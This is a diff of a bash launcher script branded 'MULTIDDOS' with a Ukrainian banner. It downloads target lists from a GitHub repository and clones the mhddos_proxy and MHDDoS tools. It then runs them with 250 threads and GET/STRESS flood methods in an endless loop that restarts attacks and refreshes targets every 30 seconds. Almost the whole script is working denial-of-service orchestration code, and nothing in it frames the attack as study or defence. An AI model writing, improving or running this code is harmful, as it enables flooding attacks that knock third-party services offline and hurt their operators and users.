@@ -7,7 +7,7 @@ mkdir multidd
 cd multidd
 
 gotop="on"
-db1000n="on"
+db1000n="off"
 uashield="off"
 vnstat="off"
 matrix="off"
@@ -15,6 +15,78 @@ threads="-t 250"
 methods="--http-methods GET STRESS"
 #rpc="--rpc 2000"
 #export debug="--debug"
+
+
+### prepare target files (main and secondary)
+prepare_targets_and_banner () {
+all_targets="/var/tmp/all.uaripper.targets"
+export main_targets="/var/tmp/main.uaripper.targets"
+main_targets_tmp="/var/tmp/main_tmp.uaripper.targets"
+export sec_targets="/var/tmp/secondary.uaripper.targets"
+sec_targets_tmp="/var/tmp/secondary_tmp.uaripper.targets"
+
+#remove previous copies
+rm -f /var/tmp/*uaripper.targets
+
+# read targets from github and put only uncommented lines in file $all_targets
+echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets_parts)" | while read LINE; do
+    if [[ $LINE != "#"* ]]; then
+        echo $LINE >> $all_targets
+    fi
+done
+
+# put every line except last line in file $sec_targets
+head -n -1 $all_targets > $sec_targets
+
+# put only last line in file $main_targets
+tail -n 1 $all_targets > $main_targets
+
+# put all addresses found in $sec_targets in a file on a new line
+for i in $(cat $sec_targets); do
+    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
+        echo $i >> $sec_targets_tmp
+    fi
+done
+
+# put all addresses found in $main_targets in a file on a new line
+for i in $(cat $main_targets); do
+    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
+        echo $i >> $main_targets_tmp
+    fi
+done
+
+# Check and save only uniq targets
+cat $sec_targets_tmp | sort | uniq > $sec_targets
+cat $main_targets_tmp | sort | uniq > $main_targets
+
+# Print greetings and number of targets (secondary, main, total)
+clear
+toilet -t --metal Український
+toilet -t --metal "   жнець"
+toilet -t --metal " MULTIDDOS"
+xdotool type --delay 100 "Шукаю завдання..."
+sleep 1
+
+xdotool type --delay 100 " Знайшов!"
+echo -e "\n"
+sleep 2
+echo -e "                         Secondary targets:" "\x1b[32m $(cat $sec_targets | sort | uniq | wc -l)\x1b[m"
+echo -e "                         Main targets:     " "\x1b[32m $(cat $main_targets | sort | uniq | wc -l)\x1b[m"
+echo -e "                         Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq | wc -l) + $(cat $main_targets | sort | uniq | wc -l))\x1b[m"
+
+echo -e "\nLoading..."
+sleep 5
+}
+
+export -f prepare_targets_and_banner
+
+prepare_targets_and_banner
+
+clear
+# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
+sudo apt-get update -q -y
+sudo apt-get install -q -y xdotool tmux vnstat toilet torsocks python3 python3-pip
+pip install --upgrade pip
 
 launch () {
 if [ ! -f "/usr/local/bin/gotop" ]; then
@@ -83,7 +155,7 @@ if [[ "$1" = ""  ]]; then launch; fi
 
 while [ "$1" != "" ]; do
     case $1 in
-        -d | --db1000n )   db1000n="off"; shift ;;
+        +d | --db1000n )   db1000n="on"; shift ;;
         +u | --uashield )   uashield="on"; shift ;;
         -t | --threads )   export threads="-t $2"; shift 2 ;;
         +m | --matrix )   matrix="on"; shift ;;
@@ -94,10 +166,6 @@ while [ "$1" != "" ]; do
     esac
 done
 
-# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
-sudo apt-get update -q -y
-sudo apt-get install -q -y tmux vnstat toilet torsocks python3 python3-pip
-pip install --upgrade pip
 
 cat > auto_bash.sh << 'EOF'
 # create swap file if system doesn't have it
@@ -112,78 +180,15 @@ cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 git clone https://github.com/MHProDev/MHDDoS.git
 
-# Prepare targets file
-file="/var/tmp/uaripper.targets"
-file_tmp="/var/tmp/tmp.targets"
-
-echo -n > $file
-echo -n > $file_tmp
-
-curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets_parts -o $file_tmp
-
-cat $file_tmp | while read LINE; do
-    if [[ $LINE != "#"* ]]; then
-        echo $LINE >> $file
-    fi
-done
-
-echo -n > $file_tmp
-for i in $(cat $file); do
-    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
-        echo $i >> $file_tmp
-    fi
-done
-
-# print total targets, print uniq targets in config file
-# echo -e "\ntotal secondary targets: " $(cat $file_tmp | wc -l)
-cat $file_tmp | sort | uniq > $file
-clear
-sec_targets=$(cat $file | sort | uniq | wc -l)
-main_targets=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -w)
-total_targets=$(expr $sec_targets + $main_targets)
-
-toilet -t --metal Український
-toilet -t --metal "  жнець"
-toilet -t --metal MULTIDDOS
-# toilet -t --metal Ukrainian
-# toilet -t --metal "  ripper"
-# toilet -t --metal MULTIDDOS
-echo -e "\x1b[32m secondary targets:\x1b[m" $sec_targets
-echo -e "\x1b[32m main targets:\x1b[m" $main_targets
-echo -e "\x1b[32m total:\x1b[m" $total_targets
-sleep 5
-
 # Restart attacks and update targets every 30 minutes
 while true; do
         pkill -f start.py; pkill -f runner.py 
-        python3 ~/multidd/mhddos_proxy/runner.py -c $file $threads $rpc $methods&
-        list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
-         while [[ $list_size = "0"  ]]; do
-            sleep 8
-            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
-        done
-        for (( i=1; i<=list_size; i++ )); do
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads&
-        done
-sleep 30m
+        python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $rpc $methods&
+        sleep 15 # to decrease load on cpu during simultaneous start
+        python3 ~/multidd/mhddos_proxy/runner.py -c $sec_targets $threads $rpc $methods&
+sleep 30
+prepare_targets_and_banner
 done
-
-#old part backup
-# while true; do
-# pkill -f start.py; pkill -f runner.py 
-#      # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
-#     list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
-#          while [[ $list_size = "0"  ]]; do
-#             sleep 5
-#             list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
-#       done
-#    for (( i=1; i<=list_size; i++ )); do
-#             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-#             python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads $rpc&
-#       done
-# sleep 30m
-# done
 EOF
 
 launch
